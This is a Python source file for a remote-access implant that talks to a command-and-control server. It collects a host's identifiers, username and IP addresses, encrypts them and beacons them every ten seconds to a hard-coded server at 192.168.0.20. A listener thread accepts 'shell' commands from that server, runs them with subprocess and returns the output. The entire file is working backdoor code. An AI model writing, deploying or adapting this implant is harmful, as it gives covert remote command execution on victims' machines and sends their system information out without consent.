import sys
import socket
import subprocess
import os
import hashlib
import time
import base64
import string
import getpass
import codecs
import uuid
from Crypto.Cipher import AES
from Crypto import Random
from threading import Thread
from time import gmtime, strftime
from uuid import getnode as get_mac

#16 bits pading
BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s : s[:-ord(s[len(s)-1:])]

#Encrypt function
def encrypt_data(msg,key):
  msg = pad(msg)
  iv = Random.new().read(AES.block_size)
  cipher = AES.new(key, AES.MODE_OFB, iv)
  msg = base64.b64encode(iv + cipher.encrypt(msg.encode("utf-8")))
  return msg

class Ping_server(Thread):
    # Thread that send alive message back to the server
    def __init__(self):
        Thread.__init__(self)

    def run(self):
        if sys.version_info[0] == 3:
            from urllib.request import urlopen
        else:
            from urllib import urlopen

        UUID = uuid.UUID(int=uuid.getnode())
        Os = os.name
        Computer = socket.gethostname()
        Loacl_ip = socket.gethostbyname(socket.gethostname())
        Hostname = getpass.getuser()
        # Gather info about the client
        MAC = str(get_mac())

        with urlopen("http://icanhazip.com/") as url:
            s = url.read()
            Public_ip = str(s)
            Public_ip = Public_ip.replace("b'", "")[:-3]

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.0.20", 1111))

        date = strftime("%d:%m:%Y:%H:%M:%S:+0000", gmtime())
        Chaine = "Init:" + date + "," + str(UUID) + "," + MAC
        # Encrypt data
        s.send(Chaine.encode())
        # Socket for keep-alive connexion
        s.close()


        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("192.168.0.20", 1111))

            time.sleep(10)
            date = strftime("%d:%m:%Y:%H:%M:%S:+0000", gmtime())
            #Chaine_plaintext = "Alive:" + date + "," + str(UUID) + "," + Os + "," + Computer + "," + Loacl_ip + "," + Hostname + "," + Public_ip

            Chaine_init2 = "Infos:" + date + "," + str(UUID) + "," + Os + "," + Computer + "," + Loacl_ip + "," + Hostname + "," + Public_ip
            #s.send(Chaine_init2.encode())

            Chaine_secure = encrypt_data(Chaine_init2, key)
            Chaine_secure = str(MAC) + str(Chaine_secure).replace("b'","")
            s.send(Chaine_secure.encode())

            print("[DEBUG] I'm Alive and seems connected to the C2 server.")

class Receive_cmd(Thread):
    # Thread that receive remote command, execute them, and send back the result to the C2 server
    def __init__(self):
        Thread.__init__(self)

    def run(self):
        s_re = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s_re.bind(('', 1111))
        # Socket for receiving command from the C2 server

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.0.20", 1111))

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.0.20", 1111))

        while True:
            s_re.listen(5)
            client, address = s_re.accept()

            if str(address[0]) == "192.168.0.20":
                print("[+] Connected with the server")
            else:
                print("[WARNING] A wrong server is trying to talk with us, abording mission NOW !!!")
                exit(0)
            # Check if the command are coming from the right C2 server

            response = client.recv(2048)
            if "shell" in str(response).replace("b'", "")[:-1]:
                print("[+] Server request a shell")

                cmd = str(response[6:]).replace("b'", "")[:-1]
                print("[+] Remote command is : " + cmd)

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(("192.168.0.20", 1111))
                # Socket for sending result of server query

                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
                stdout_value = proc.stdout.read() + proc.stderr.read()
                args = stdout_value

                s.send(str('CMD:').encode() + args)

                print("[+] result : " + str(args))
                s.close()
            else:
                print("[-] Server request something that i can't handle now. Update me !")

def custom_encode_part2_key(MAC):
# Take each digit of the MAC address, and get the letter of this position in the latin alphabet, then, rot-13 the string
# This is going to be the part 2 of the AES key
    key_part2 = ''
    for numbers in MAC:
        key_part2 += str(string.ascii_lowercase[int(numbers)])
    key_part3 = codecs.encode(key_part2, 'rot-13')
    return key_part3

# gather things for the custom AES key
UUID = uuid.UUID(int=uuid.getnode())
MAC = str(get_mac())

# Create a custom AES key
key_part1 = str(base64.b64encode(str(UUID).encode("utf-8"))).replace("b'","")[:-1]
key_part2 = str(custom_encode_part2_key(MAC))
key = str(key_part1) + str(key_part2)
print("[DEBUG] My custom AES encryption key is : " + str(key))

# Init AES
PSK = bytes(key.encode())
key = hashlib.sha256(PSK).digest()

Ping_server_Thread = Ping_server()
Receive_cmd_Thread = Receive_cmd()

Ping_server_Thread.start()
Receive_cmd_Thread.start()
# Start thread